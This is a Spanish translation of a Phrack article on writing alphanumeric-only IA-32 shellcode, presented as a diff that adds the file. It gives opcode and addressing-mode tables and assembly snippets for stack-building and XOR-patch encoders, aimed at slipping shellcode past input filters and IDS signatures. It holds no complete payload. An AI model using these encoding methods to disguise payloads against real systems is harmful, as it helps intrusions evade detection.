@@ -1,0 +1,2485 @@
+                             ==Phrack Inc.==
+
+             Volumen 0x0b, Numero 0x39, Archivo #0x0f de 0x12
+
+|=---------=[ Escribiendo shellcodes alfanumericos para ia32 ]=----------=|
+|=-----------------------------------------------------------------------=|
+|=--------------------------=[ rix@hert.org ]=---------------------------=|
+
+
+
+----| Introduccion
+
+Hoy, mas y mas exploits necesitan ser escritos usando assembler,
+particularmente para escribir shellcodes clasicos (para buffer overflows,
+o ataques format string,...).
+
+Varios programas ahora alcanzan poderosos filtrados input, usando funciones
+como strspn() o strcspn(): previene a la gente de insertar facilmente
+shellcodes en diferentes buffers.
+En la misma forma, observamos mas y mas IDS detectando secuencias de opcodes
+sospechosas, algunas de ellas indicando la presencia de un shellcode.
+
+Una forma de evadir tales tecnicas de coincidencia de patron es usar
+polimorfismo, como usando herramientas tales como ADMmutate de K2.
+Otra forma de hacer esto va a ser presentada aqui: trataremos de escribir
+shellcodes IA32 no filtrables, usando solo caracteres alfanumericos: mas
+precisamente, usaremos solo caracteres como '0'->'9','A'->'Z' y 'a'->'z'.
+
+Si podemos escribir tales shellcodes alfanumericos, podremos guardar nuestros
+shellcodes casi en donde sea! Vamos a enumerar algunas posibilidades
+interesantes:
+- inputs filtrados
+- variables de entorno
+- comandos clasicos, instrucciones y parametros desde protocolos usuales
+- nombres de archivo y directorios
+- nombres de usuario y passwords
+- ...
+
+
+
+----| Las instrucciones utilizables
+
+Antes de empezar a pensar acerca de tecnicas particulares, vamos a echar una
+mirada primero a las instrucciones de IA32 que seran interesantes para
+nosotros.
+
+Primero que todo, algunas convenciones (desde las referencias Intel) que
+usaremos en nuestros arrays sumarios:
+
+ <r8>          : indica un registro byte.
+ <r32>         : indica un registro doubleword.
+ <r/m8>        : indica un registro byte o un byte desde memoria (a traves
+                 de un puntero).
+ <r/m32>       : indica un registro doubleword o un doubleword desde
+                 memoria (a traves de un puntero).
+ </r>          : indica que el byte de instruccion es seguido de
+                 varios posibles bytes operando. Uno de esos bytes, el
+                 "ModR/M byte", nos permite especificar la forma de
+                 direccionamiento usada, con la ayuda de campos de 3 bits.
+
+                     ModR/M byte:                 
+                     
+                    7 6 5 4 3 2 1 0 
+                   +---+-----+-----+
+                   |mod|  r  | r/m |
+                   +---+-----+-----+
+                   
+                 En este caso, la </r> nos indica que el ModR/M byte
+                 contendra un registro operando y un registro o memoria
+                 operando.
+ <imm8>        : indica un valor de byte inmediato.
+ <imm32>       : indica un valor doubleword inmediato.
+ <disp8>       : indica un desplazamiento firmado de 8 bits.
+ <disp32>      : indica un desplazamiento firmado de 32 bits.
+ <...>         : indica que la instruccion necesita posiblemente algunos
+                 operandos (eventualmente encodeados en varios bytes operando)
+
+OPCODES ALFANUMERICOS:
+
+Ahora, vamos a recordar todas las instrucciones con opcodes alfanumericos:
+
+opcode hexadecimal | char | instruccion                    | interesante
+-------------------+------+--------------------------------+------------
+30 </r>            | '0'  | xor <r/m8>,<r8>                | SI
+31 </r>            | '1'  | xor <r/m32>,<r32>              | SI
+32 </r>            | '2'  | xor <r8>,<r/m8>                | SI
+33 </r>            | '3'  | xor <r32>,<r/m32>              | SI
+34 <imm8>          | '4'  | xor al,<imm8>                  | SI
+35 <imm32>         | '5'  | xor eax,<imm32>                | SI
+36                 | '6'  | ss:  (Prefijo Segment Override)|
+37                 | '7'  | aaa                            |
+38 </r>            | '8'  | cmp <r/m8>,<r8>                | SI
+39 </r>            | '9'  | cmp <r/m32>,<r32>              | SI
+                   |      |                                |
+41                 | 'A'  | inc ecx                        | SI
+42                 | 'B'  | inc edx                        | SI
+43                 | 'C'  | inc ebx                        | SI
+44                 | 'D'  | inc esp                        | SI
+45                 | 'E'  | inc ebp                        | SI
+46                 | 'F'  | inc esi                        | SI
+47                 | 'G'  | inc edi                        | SI
+48                 | 'H'  | dec eax                        | SI
+49                 | 'I'  | dec ecx                        | SI
+4A                 | 'J'  | dec edx                        | SI
+4B                 | 'K'  | dec ebx                        | SI
+4C                 | 'L'  | dec esp                        | SI
+4D                 | 'M'  | dec ebp                        | SI
+4E                 | 'N'  | dec esi                        | SI
+4F                 | 'O'  | dec edi                        | SI
+50                 | 'P'  | push eax                       | SI
+51                 | 'Q'  | push ecx                       | SI
+52                 | 'R'  | push edx                       | SI
+53                 | 'S'  | push ebx                       | SI
+54                 | 'T'  | push esp                       | SI
+55                 | 'U'  | push ebp                       | SI
+56                 | 'V'  | push esi                       | SI
+57                 | 'W'  | push edi                       | SI
+58                 | 'X'  | pop eax                        | SI
+59                 | 'Y'  | pop ecx                        | SI
+5A                 | 'Z'  | pop edx                        | SI
+                   |      |                                |
+61                 | 'a'  | popa                           | SI
+62 <...>           | 'b'  | bound <...>                    |
+63 <...>           | 'c'  | arpl <...>                     |
+64                 | 'd'  | fs:  (Prefijo Segment Override)|
+65                 | 'e'  | gs:  (Prefijo Segment Override)|
+66                 | 'f'  | o16: (Tama~o operando Override)| SI
+67                 | 'g'  | a16:(Tama~o direccion Override)|
+68 <imm32>         | 'h'  | push <imm32>                   | SI
+69 <...>           | 'i'  | imul <...>                     | 
+6A <imm8>          | 'j'  | push <imm8>                    | SI
+6B <...>           | 'k'  | imul <...>                     |
+6C <...>           | 'l'  | insb <...>                     |
+6D <...>           | 'm'  | insd <...>                     |
+6E <...>           | 'n'  | outsb <...>                    |
+6F <...>           | 'o'  | outsd <...>                    |
+70 <disp8>         | 'p'  | jo <disp8>                     | SI
+71 <disp8>         | 'q'  | jno <disp8>                    | SI
+72 <disp8>         | 'r'  | jb <disp8>                     | SI
+73 <disp8>         | 's'  | jae <disp8>                    | SI
+74 <disp8>         | 't'  | je <disp8>                     | SI
+75 <disp8>         | 'u'  | jne <disp8>                    | SI
+76 <disp8>         | 'v'  | jbe <disp8>                    | SI
+77 <disp8>         | 'w'  | ja <disp8>                     | SI
+78 <disp8>         | 'x'  | js <disp8>                     | SI
+79 <disp8>         | 'y'  | jns <disp8>                    | SI
+7A <disp8>         | 'z'  | jp <disp8>                     | SI
+
+Que podemos deducir directamente de todo esto?
+
+- NO INSTRUCCIONES "MOV":
+ => necesitamos encontrar otra forma de manipular nuestros datos.
+- NO INSTRUCCIONES ARITMETICAS INTERESANTES ("ADD","SUB",...):
+ => solo podemos usar DEC e INC.
+ => no podemos usar INC con el registro EAX.
+- LA INSTRUCCIONES "XOR":
+ => podemos usar XOR con bytes y doublewords.
+ => muy interesante para cosas basicas de criptografia.
+- INSTRUCCIONES "PUSH"/"POP"/"POPAD":
+ => podemos pushear bytes y doublewords directamente en la pila.
+ => solo podemos usar POP con los registros EAX,ECX y EDX.
+ => parece que vamos a jugar de nuevo con la pila.
+- EL TAMA~O DEL OPERANDO OVERRIDE "O16":
+ => podemos tambien alcanzar manipulaciones de 16 bits con este prefijo de
+    instruccion.
+- INSTRUCCIONES "JMP" Y "CMP":
+ => podemos realizar algunas comparaciones.
+ => no podemos usar directamente valores constantes con CMP.
+
+
+Ademas, No olvides que los operandos de estas instrucciones (</r>, <imm8>,
+<imm32>, <disp8> y <disp32> deben tambien mantenerse alfanumericos. Puede
+hacer a nuestra tarea complicada una vez mas...
+
+
+EL BYTE "ModR/M":
+
+Por ejemplo, observemos el efecto de esta molestia suplementaria en el byte
+ModR/M (</r>), particularmente para XOR y CMP.
+En el siguiente array, encontraremos todos los valores posibles para este
+byte ModR/M, y sus interpretaciones como <r8>/<r32> (ahora primero) y
+operandos <r/m> (primer columna).
+
+           <r8>:|  al  |  cl  |  dl  |  bl  |  ah  |  ch  |  dh  |  bh 
+          <r32>:| eax  | ecx  | edx  | ebx  | esp  | ebp  | esi  | edi
+<r/m>           |      |      |      |      |      |      |      |
+--:-------------+------+------+------+------+------+------+------+------
+(mod=00)        |      |      |      |      |      |      |      |
+[eax]           |00    |08    |10    |18    |20    |28    |30 '0'|38 '8'
+[ecx]           |01    |09    |11    |19    |21    |29    |31 '1'|39 '9'
+[edx]           |02    |0A    |12    |1A    |22    |2A    |32 '2'|3A
+[ebx]           |03    |0B    |13    |1B    |23    |2B    |33 '3'|3B
+[<SIB>]         |04    |0C    |14    |1C    |24    |2C    |34 '4'|3C
+[<disp32>]      |05    |0D    |15    |1D    |25    |2D    |35 '5'|3D
+[esi]           |06    |0E    |16    |1E    |26    |2E    |36 '6'|3E
+[edi]           |07    |0F    |17    |1F    |27    |2F    |37 '7'|3F
+----------------+------+------+------+------+------+------+------+------
+(mod=01)        |      |      |      |      |      |      |      |
+[eax+<disp8>]   |40    |48 'H'|50 'P'|58 'X'|60    |68 'h'|70 'p'|78 'x'
+[ecx+<disp8>]   |41 'A'|49 'I'|51 'Q'|59 'Y'|61 'a'|69 'i'|71 'q'|79 'y'
+[edx+<disp8>]   |42 'B'|4A 'J'|52 'R'|5A 'Z'|62 'b'|6A 'j'|72 'r'|7A 'z'
+[ebx+<disp8>]   |43 'C'|4B 'K'|53 'S'|5B    |63 'c'|6B 'k'|73 's'|7B
+[<SIB>+<disp8>] |44 'D'|4C 'L'|54 'T'|5C    |64 'd'|6C 'l'|74 't'|7C
+[ebp+<disp8>]   |45 'E'|4D 'M'|55 'U'|5D    |65 'e'|6D 'm'|75 'u'|7D
+[esi+<disp8>]   |46 'F'|4E 'N'|56 'V'|5E    |66 'f'|6E 'n'|76 'v'|7E
+[edi+<disp8>]   |47 'G'|4F 'O'|57 'W'|5F    |67 'g'|6F 'o'|77 'w'|7F
+----------------+------+------+------+------+------+------+------+------
+(mod=10)        |      |      |      |      |      |      |      |
+[eax+<disp32>]  |80    |88    |90    |98    |A0    |A8    |B0    |B8
+[ecx+<disp32>]  |81    |89    |91    |99    |A1    |A9    |B1    |B9
+[edx+<disp32>]  |82    |8A    |92    |9A    |A2    |AA    |B2    |BA
+[ebx+<disp32>]  |83    |8B    |93    |9B    |A3    |AB    |B3    |BB
+[<SIB>+<disp32>]|84    |8C    |94    |9C    |A4    |AC    |B4    |BC
+[ebp+<disp32>]  |85    |8D    |95    |9D    |A5    |AD    |B5    |BD
+[esi+<disp32>]  |86    |8E    |96    |9E    |A6    |AE    |B6    |BE
+[edi+<disp32>]  |87    |8F    |97    |9F    |A7    |AF    |B7    |BF
+---+------------+------+------+------+------+------+------+------+------
+(mod=11)        |      |      |      |      |      |      |      |
+al | eax        |C0    |C8    |D0    |D8    |E0    |E8    |F0    |F8
+cl | ecx        |C1    |C9    |D1    |D9    |E1    |E9    |F1    |F9
+dl | edx        |C2    |CA    |D2    |DA    |E2    |EA    |F2    |FA
+bl | ebx        |C3    |CB    |D3    |DB    |E3    |EB    |F3    |FB
+ah | esp        |C4    |CC    |D4    |DC    |E4    |EC    |F4    |FC
+ch | ebp        |C5    |CD    |D5    |DD    |E5    |ED    |F5    |FD
+dh | esi        |C6    |CE    |D6    |DE    |E6    |EE    |F6    |FE
+bh | edi        |C7    |CF    |D7    |DF    |E7    |EF    |F7    |FF
+
+Que podemos deducir esta vez para XOR y CMP?
+
+- ALGUNAS INSTRUCCIONES "xor [<r32>],dh" Y "xor [<r32>],bh".
+- LA INSTRUCCION "xor [<disp32>],dh".
+- ALGUNAS INSTRUCCIONES "xor [<r32>+<disp8>],<r8>".
+- NO INSTRUCCIONES "xor <r8>,<r8>".
+
+- ALGUNAS INSTRUCCIONES "xor [<r32>],esi" Y "xor [<r32>],edi".
+- LA INSTRUCCION "xor [<disp32>],esi".
+- ALGUNAS INSTRUCCIONES "xor [<r32>+<disp8>],<r32>".
+- NO INSTRUCCIONES "xor <r32>,<r32>".
+
+- ALGUNAS INSTRUCCIONES "xor dh,[<r32>]" Y "xor bh,[<r32>]".
+- LA INSTRUCCION "xor dh,[<disp32>]".
+- ALGUNAS INSTRUCCIONES "xor <r8>,[<r32>+<disp8>]".
+
+- ALGUNAS INSTRUCCIONES "xor esi,[<r32>]" Y "xor edi,[<r32>]".
+- LA INSTRUCCION "xor esi,[<disp32>]".
+- ALGUNAS INSTRUCCIONES "xor <r32>,[<r32>+<disp8>]".
+
+- ALGUNAS INSTRUCCIONES "cmp [<r32>],dh" Y "cmp [<r32>],bh".
+- LA INSTRUCCION "cmp [<disp32>],dh".
+- ALGUNAS INSTRUCCIONES "cmp [<r32>+<disp8>],<r8>".
+- NO INSTRUCCIONES "cmp <r8>,<r8>".
+
+- ALGUNAS INSTRUCCIONES "cmp [<r32>],esi" Y "cmp [<r32>],edi".
+- LA INSTRUCCION "cmp [<disp32>],esi".
+- ALGUNAS INSTRUCCIONES "cmp [<r32>+<disp8>],<r32>".
+- NO INSTRUCCIONES "cmp <r32>,<r32>".
+
+
+EL BYTE "SIB":
+
+Para ser completo, debemos tambien analizar posibilidades ofrecidas por el
+byte Scale Index Base ("<SIB>" en nuestro ultimo array). Este byte SIB nos
+permite crear direcciones teniendo la siguiente forma:
+ <SIB> = <base>+(2^<scale>)*<index>
+Donde:
+ <base>  : indica un registro base.
+ <index> : indica un registro index.
+ <scale> : indica un factor escala para el registro index.
+
+Aqui estan los diferentes campos de bit de este byte:
+
+  7 6 5 4 3 2 1 0 
+ +---+-----+-----+
+ |sc.|index|base |
+ +---+-----+-----+
+
+Miremos este ultimo array:
+
+    <base>:| eax  | ecx  | edx  | ebx  | esp  | ebp  | esi  | edi
+           |      |      |      |      |      | (if  |      |
+(2^<scale>)|      |      |      |      |      |  MOD |      |
+*<index>   |      |      |      |      |      | !=00)|      |
+----:------+------+------+------+------+------+------+------+------
+eax        |00    |01    |02    |03    |04    |05    |06    |07
+ecx        |08    |09    |0A    |0B    |0C    |0D    |0E    |0F
+edx        |10    |11    |12    |13    |14    |15    |16    |17
+ebx        |18    |19    |1A    |1B    |1C    |1D    |1E    |1F
+0          |20    |21    |22    |23    |24    |25    |26    |27
+ebp        |28    |29    |2A    |2B    |2C    |2D    |2E    |2F
+esi        |30 '0'|31 '1'|32 '2'|33 '3'|34 '4'|35 '5'|36 '6'|37 '7'
+edi        |38 '8'|39 '9'|3A    |3B    |3C    |3D    |3E    |3F
+-----------+------+------+------+------+------+------+------+------
+2*eax      |40    |41 'A'|42 'B'|43 'C'|44 'D'|45 'E'|46 'F'|47 'G'
+2*ecx      |48 'H'|49 'I'|4A 'J'|4B 'K'|4C 'L'|4D 'M'|4E 'N'|4F 'O'
+2*edx      |50 'P'|51 'Q'|52 'R'|53 'S'|54 'T'|55 'U'|56 'V'|57 'W'
+2*ebx      |58 'X'|59 'Y'|5A 'Z'|5B    |5C    |5D    |5E    |5F
+0          |60    |61 'a'|62 'b'|63 'c'|64 'd'|65 'e'|66 'f'|67 'g'
+2*ebp      |68 'h'|69 'i'|6A 'j'|6B 'k'|6C 'l'|6D 'm'|6E 'n'|6F 'o'
+2*esi      |70 'p'|71 'q'|72 'r'|73 's'|74 't'|75 'u'|76 'v'|77 'w'
+2*edi      |78 'x'|79 'y'|7A 'z'|7B    |7C    |7D    |7E    |7F
+-----------+------+------+------+------+------+------+------+------
+4*eax      |80    |81    |82    |83    |84    |85    |86    |87
+4*ecx      |88    |89    |8A    |8B    |8C    |8D    |8E    |8F
+4*edx      |90    |91    |92    |93    |94    |95    |96    |97
+4*ebx      |98    |99    |9A    |9B    |9C    |9D    |9E    |9F
+0          |A0    |A1    |A2    |A3    |A4    |A5    |A6    |A7
+4*ebp      |A8    |A9    |AA    |AB    |AC    |AD    |AE    |AF
+4*esi      |B0    |B1    |B2    |B3    |B4    |B5    |B6    |B7
+4*edi      |B8    |B9    |BA    |BB    |BC    |BD    |BE    |BF
+-----------+------+------+------+------+------+------+------+------
+8*eax      |C0    |C1    |C2    |C3    |C4    |C5    |C6    |C7
+8*ecx      |C8    |C9    |CA    |CB    |CC    |CD    |CE    |CF
+8*edx      |D0    |D1    |D2    |D3    |D4    |D5    |D6    |D7
+8*ebx      |D8    |D9    |DA    |DB    |DC    |DD    |DE    |DF
+0          |E0    |E1    |E2    |E3    |E4    |E5    |E6    |E7
+8*ebp      |E8    |E9    |EA    |EB    |EC    |ED    |EE    |EF
+8*esi      |F0    |F1    |F2    |F3    |F4    |F5    |F6    |F7
+8*edi      |F8    |F9    |FA    |FB    |FC    |FD    |FE    |FF
+-----------+------+------+------+------+------+------+------+------
+(if <base> |
+   ==ebp   | => <SIB> = <disp32>+(2^<scale>)*<index>
+and MOD==0)|
+-----------+-------------------------------------------------------
+
+Que podemos deducir de este ultimo array?
+- ALGUNAS DIRECCIONES SIB "<r32>+esi".
+- ALGUNAS DIRECCIONES SIB "<r32>+2*<r32>".
+- NO DIRECCIONES SIB "<r32>+4*<r32>" O "<r32>+8*<r32>".
+
+
+Tambien recuerda que el orden usual de los bytes para una instruccion
+completa con posibles ModR/M, byte SIB y disp8/disp32 es:
+ <opcode> [Mode R/M byte] [<SIB>] [<disp8>/<disp32>]
+
+LA INSTRUCCION "XOR":
+
+Notamos que tenemos algunas posibilidades para la instruccion XOR. Vamos a
+recordar brevemente todas las combinaciones logicas posibles:
+
+a | b | a XOR b (=c)
+--+---+-------------
+0 | 0 |    0
+0 | 1 |    1
+1 | 0 |    1
+1 | 1 |    0
+
+Que podemos deducir de esto?
+-  a XOR a = 0
+ => podemos inicializar facilmente los registros a 0.
+-  0 XOR b = b
+ => podemos cargar facilmente valores en registro conteniendo 0.
+-  1 XOR b = NOT b
+ => podemos invertir valores facilmente usando registros conteniendo
+    0xFFFFFFFF.
+-  a XOR b = c
+   b XOR c = a
+   a XOR c = b
+ => podemos encontrar facilmente un complemento de XOR del byte.
+
+
+
+----| Manipulaciones clasicas
+
+
+Ahora, vamos a ver varios metodos permitiendo alcanzar un maximo de
+manipulaciones usuales de bajo nivel desde las instrucciones autorizadas
+listadas arriba.
+
+
+INICIALIZANDO REGISTROS CON VALORES PARTICULARES:
+
+Primero que todo, pensemos acerca de un metodo que nos permite inicializar
+algunos valores particulares muy utiles en nuestros registros, como 0 o
+0xFFFFFFFF (lee alphanumeric_initialize_registers() en asc.c).
+Por ejemplo:
+
+ push 'aaaa'                      ; 'a' 'a' 'a' 'a'
+ pop eax                          ;EAX ahora contiene 'aaaa'.
+ xor eax,'aaaa'                   ;EAX ahora contiene 0.
+
+ dec eax                          ;EAX ahora contiene 0xFFFFFFFF.
+
+Vamos a memorizar esos valores especiales en registros particulares, para
+poder usarlos facilmente.
+
+
+INICIALIZANDO TODOS LOS REGISTROS:
+
+Al comienzo de nuestro shellcode, necesitaremos inicializar varios registros
+con valores que probablemente usaremos despues.
+No olvides que no podemos usar POP con todos los registros (solo EAX,ECX y
+EDX) Usaremos entonces POPAD. Por ejemplo, si suponemos que EAX contiene 0
+y ECX contiene 'aaaa', podemos inicializar todos los registros facilmente:
+
+ push eax                         ;EAX contendra 0.
+ push ecx                         ;no hay cambios para ECX ('aaaa').
+ push esp                         ;EDX contendra ESP despues POPAD.
+ push eax                         ;EBX contendra 0.
+ push esp                         ;no hay cambios para ESP.
+ push ebp                         ;no hay cambios para EBP.
+ push ecx                         ;ESI contendra 'aaaa' despues POPAD.
+ dec eax                          ;EAX contendra 0xFFFFFFFF.
+ push eax                         ;EDI contendra 0xFFFFFFFF.
+ popad                            ;obtenemos todos los valores de la pila.
+
+
+COPIANDO DESDE REGISTROS A REGISTROS:
+
+Usando POPAD, podemos tambien copiar datos desde cualquier registro a
+cualquier registro, si no podemos hacer PUSH/POP directamente. Por ejemplo,
+copiando EAX a EBX:
+
+ push eax                         ;sin cambio.
+ push ecx                         ;sin cambio.
+ push edx                         ;sin cambio.
+ push eax                         ;EBX contendra EAX despues POPAD.
+ push eax                         ;sin cambio (ESP no "popeado").
+ push ebp                         ;sin cambio.
+ push esi                         ;sin cambio.
+ push edi                         ;sin cambio.
+ popad
+
+Notemos que el valor de ESP es cambiado antes del PUSH desde que tenemos 2
+PUSH precediendolo, pero POPAD POPea todos los registros excepto ESP desde
+la pila.
+
+
+SIMULANDO UNA INSTRUCCION "NOT":
+
+Usando XOR, podemos realizar facilmente una instruccion NOT clasica. Supon
+que EAX contiene el valor que queremos invertir, y EDI contiene 0xFFFFFFFF:
+
+ push eax                         ;pusheamos el valor que queremos invertir.
+ push esp                         ;pusheamos el offset del valor que habiamos
+                                  ; pusheado en la pila.
+ pop ecx                          ;ECX ahora contiene este offset.
+ xor [ecx],edi                    ;invertimos el valor.
+ pop eax                          ;lo obtenemos de nuevo en EAX.
+
+
+LEYENDO BYTES DESDE MEMORIA A UN REGISTRO:
+
+Una vez mas, usando XOR y el valor 0 (aqui en EAX), podemos leer un byte
+arbitrario en DH:
+
+ push eax                         ;pusheamos 0 en la pila.
+ pop edx                          ;lo obtenemos de nuevo en ECX
+                                  ;(DH es ahora 0).
+ xor dh,[esi]                     ;leemos nuestro byte usando [esi] como
+                                  ;direccion fuente.
+
+Podemos tambien leer valores no lejos de [esp] en la pila, usando DEC/INC en
+ESP, y despues usando un POP clasico.
+
+
+ESCRIBIENDO BYTES ALFANUMERICOS A MEMORIA:
+
+Si necesitamos un peque~o lugar para escribir bytes, podemos usar PUSH
+facilmente y escribir nuestros bytes decrementando direcciones de memoria
+y jugando con INC en ESP.
+
+ push 'cdef'                      ;                 'c' 'd' 'e' 'f'
+ push 'XXab'                      ; 'X' 'X' 'a' 'b' 'c' 'd' 'e' 'f'
+ inc esp                          ;     'X' 'a' 'b' 'c' 'd' 'e' 'f'
+ inc esp                          ;         'a' 'b' 'c' 'd' 'e' 'f'
+
+Ahora, ESP apunta a un string "abcdef" escrito en la pila...
+Podemos tambien usar el prefijo de instruccion 016 para pushear directamente
+un valor de 16 bits:
+
+ push 'cdef'                      ;         'c' 'd' 'e' 'f'
+ push 'ab'                        ; 'a' 'b' 'c' 'd' 'e' 'f'
+
+
+
+----| Los metodos
+
+
+Ahora, combinemos algunas de estas interesantes manipulaciones para generar
+shellcodes alfanumericos efectivamente.
+Vamos a generar un motor alfanumerico, que construira nuestro shellcode
+(no-alfanumerico) original. Propondremos 2 tecnicas diferentes:
+
+
+USANDO LA PILA:
+
+Ya que tenemos un set de instrucciones relacionadas a la pila, vamos a
+usarlas eficientemente.
+En realidad, vamos a construir nuestro codigo original gradualmente mientras
+pusheamos valores en la pila, desde el ultimo byte (B1) de nuestro shellcode
+original al primero (lee alphanumeric_stack_generate() y la opcion "-m stack"
+en asc.c):
+
+ .... 00  00  00  00  00  00  00  00  00  00  00  00  SS  SS  SS  SS ....
+
+ .... 00  00  00  00  00  00  00  00  00  00  B2  B1  SS  SS  SS  SS ....
+                                              <-----
+ .... 00  00  00  00  00  00  00  B5  B4  B3  B2  B1  SS  SS  SS  SS ....
+                                  <-----------------
+ .... 00  00  00  B9  B8  B7  B6  B5  B4  B3  B2  B1  SS  SS  SS  SS ....
+                  <-------shellcode original--------
+
+Donde: SS representa bytes ya presentes en la pila.
+       00 representa bytes no usados en la pila.
+       Bx representa bytes de nuestro shellcode no-alfanumerico original.
+
+Es realmente facil, porque tenemos instrucciones para pushear doublewords o
+words, y podemos tambien jugar con INC ESP para simplemente pushear un byte.
+El problema es que no podemos pushear directamente bytes no-alfanumericos.
+Vamos a tratar de clasificar bytes de nuestro codigo original en diferentes
+categorias. (lee alphanumeric_get_category() en asc.c).
+Podemos de esta manera escribir minusculos bloques de 1,2,3 o 4 bytes desde
+la misma categoria en la pila (lee alphanumeric_stack_generate_push() en
+asc.c).
+Observemos como realizar esto:
+
+- CATEGORY_00:
+ Suponemos que el registro (<r>,<r32>,<r16>) contiene el valor 0xFFFFFFFF.)
+ 
+  1 BYTE:
+   inc <r32>                      ;<r32> ahora contiene 0.
+   push <r16>                     ; 00  00
+   inc esp                        ;     00
+   dec <r32>                      ;<r32> ahora contiene 0xFFFFFFFF.
+   
+  2 BYTES:
+   inc <r32>                      ;<r32> ahora contiene 0.
+   push <r16>                     ; 00  00
+   dec <r32>                      ;<r32> ahora contiene 0xFFFFFFFF.   
+
+  3 BYTES:
+   inc <r32>                      ;<r32> ahora contiene 0.
+   push <r32>                     ; 00  00  00  00
+   inc esp                        ;     00  00  00
+   dec <r32>                      ;<r32> ahora contiene 0xFFFFFFFF.      
+
+  4 BYTES:
+   inc <r32>                      ;<r32> ahora contiene 0.
+   push <r32>                     ; 00  00  00  00
+   dec <r32>                      ;<r32> ahora contiene 0xFFFFFFFF.
+
+- CATEGORY_FF_
+ Usamos el mismo mecanismo que para CATEGORY_00, excepto que no necesitamos
+ INC/DECrementar el registro conteniendo 0xFFFFFFFF.
+
+- CATEGORY_ALPHA:
+ Simplemente pusheamos los valores alfanumericos en la pila, posiblemente
+ usando un byte alfanumerico al azar "??" para llenar el doubleword o el
+ word.
+ 
+  1 BYTE:
+   push 0x??B1                    ; ??  B1
+   inc esp                        ;     B1
+
+  2 BYTES:
+   push 0xB2B1                    ; B2  B1
+
+  3 BYTES:
+   push 0x??B3B2B1                ; ??  B3  B2  B1
+   inc esp                        ;     B3  B2  B1
+
+  4 BYTES:
+   push 0xB4B3B2B1                ; B4  B3  B2  B1    
+
+- CATEGORY_XOR:
+ Elegimos bytes alfanumericos al azar X1,X2,X3,X4 e Y1,Y2,Y3,Y4, por lo que
+ X1 xor Y1 = B1, X2 xor Y2 = B2, X3 xor Y3 = B3 y X4 xor Y4 = B4
+ (lee alphanumeric_get_complement() en asc.c).
+
+  1 BYTE:
+   push 0x??X1                    ; ??  X1
+   pop ax                         ;AX ahora contiene 0x??X1.
+   xor ax,0x??Y1                  ;AX ahora contiene 0x??B1.
+   push ax                        ; ??  B1
+   inc esp                        ;     B1
+  
+  2 BYTES:
+   push 0xX2X1                    ; X2  X1
+   pop ax                         ;AX ahora contiene 0xX2X1.
+   xor ax,0xY2Y1                  ;AX ahora contiene 0xB2B1.
+   push ax                        ; B2  B1
+
+  3 BYTES:
+   push 0x??X3X2X1                ; ??  X3  X2  X1
+   pop eax                        ;EAX ahora contiene 0x??X3X2X1.
+   xor eax,0x??Y3Y2Y1             ;EAX ahora contiene 0x??B3B2B1.
+   push eax                       ; ??  B3  B2  B1
+   inc eax                        ;     B3  B2  B1
+
+  4 BYTES:
+   push 0xX4X3X2X1                ; X4  X3  X2  X1
+   pop eax                        ;EAX ahora contiene 0xX4X3X2X1.
+   xor eax,0xY4Y3Y2Y1             ;EAX ahora contiene 0xB4B3B2B1.
+   push eax                       ; B4  B3  B2  B1
+
+- CATEGORY_ALPHA_NOT y CATEGORY_XOR_NOT:
+ Simplemente generamos bytes (N1,N2,N3,N4) de CATEGORY_ALPHA y CATEGORY_XOR
+ realizando una operacion NOT en el valor original. Debemos entonces cancelar
+ el efecto de esta operacion, realizando una operacion NOT de nuevo pero esta
+ vez en la pila (lee alphanumeric_stack_generate_not() en asc.c).
+
+  1 BYTE:
+   push esp
+   pop ecx                        ;ECX ahora contiene ESP.
+                                  ; N1
+   xor [ecx],<r8>                 ; B1
+
+  2 BYTES:
+   push esp
+   pop ecx                        ;ECX ahora contiene ESP.
+                                  ; N2  N1
+   xor [ecx],<r16>                ; B2  B1
+
+  3 BYTES:
+   push esp
+   pop ecx                        ;ECX ahora contiene ESP.
+                                  ;     N3  N2  N1
+   dec ecx                        ; ??  N3  N2  N1
+   xor [ecx],<r32>                ; ??  B3  B2  B1
+   inc ecx                        ;     B3  B2  B1
+
+  4 BYTES:
+   push esp
+   pop ecx                        ;ECX ahora contiene ESP.
+                                  ; N4  N3  N2  N1
+   xor [ecx],<r32>                ; B4  B3  B2  B1
+
+Mientras agregamos cada uno de esos peque~os codigos, con los valores
+apropiados, para nuestro shellcode alphanumerico, generaremos un shellcode
+alfanumerico que construira nuestro shellcode no alfanumerico en la pila.
+
+
+USANDO "XOR PATCHES":
+
+Otra posibilidad es tomar ventaja de un modo de direccionamiento interesante,
+usando ambos bytes ModR/M y SIB en combinacion con la siguiente instruccion
+XOR (lee alphanumeric_patches_generate_xor() y la opcion "-m patches" en
+asc.c):
+
+ xor [<base>+2*<index>+<disp8>],<r8>
+ xor [<base>+2*<index>+<disp8>],<r16> 
+ xor [<base>+2*<index>+<disp8>],<r32>
+
+Supon que tenemos una arquitectura tal para nuestro shellcode:
+
+ [initialization][patcher][               data                ]
+
+Podemos inicializar algunos valores y registros en [initialization], despues
+usar instrucciones XOR en [patcher] para patchear bytes en [data]:
+(lee alphanumeric_patches_generate() en asc.c)
+
+ [initialization][patcher][shellcode original no alfanumerico]
+
+Para usar esta tecnica, necesitamos saber la direccion de comienzo de nuestro
+shellcode. Podemos guardala en un registro <base>, como EBX o EDI.
+Debemos entonces calcular el offset para el primer byte no alfanumerico a
+patchear, y generar este offset de nuevo usando un registro <index> y un
+valor <disp8> alfanumerico:
+
+ [initialization][patcher][shellcode original no alfanumerico]
+  |                        |
+<base>         <base>+2*<index>+<disp8>
+
+El principal tema aqui es que nuestro offset va a depender del largo de
+nuestro [initialization] y [patcher]. Ademas, este offset no es
+necesariamente alfanumerico. Por lo tanto, generaremos este offset en
+[initialization], escribiendolo en la pila con nuestra tecnica previa.
+
+Trataremos de generar el mas peque~o [initialization] posible, incrementando
+gradualmente un offset arbitrario, tratando de guardar el codigo para
+calcularlo en [initialization], y posiblemente agregar algunos bytes rellenos
+(lee alphanumeric_patches_generate_initialization() en asc.c):
+
+ Primer repeticion:
+  [######################][patcher][data]
+                           |
+                         offset                         
+  [codigo para generar este offset] => demasiado grande.
+
+ Segunda repeticion:
+  [##########################][patcher][data]
+                               |
+                         --->offset                         
+  [  codigo para generar este offset  ] => demasiado grande.
+
+ Na repeticion:
+  [#######################################][patcher][data]
+                                            |
+                         ---------------->offset
+  [ codigo para generar este offset ] => perfecto.
+
+ Agregando algunos bytes de relleno:
+  [#######################################][patcher][data]
+                                            |
+                         ---------------->offset
+  [ codigo para generar este offset ][relleno] =>para obtener el tama~o exacto.
+
+ Y finalmente el shellcode compilado:
+  [ codigo para generar el offset  ][relleno][patcher][data]
+
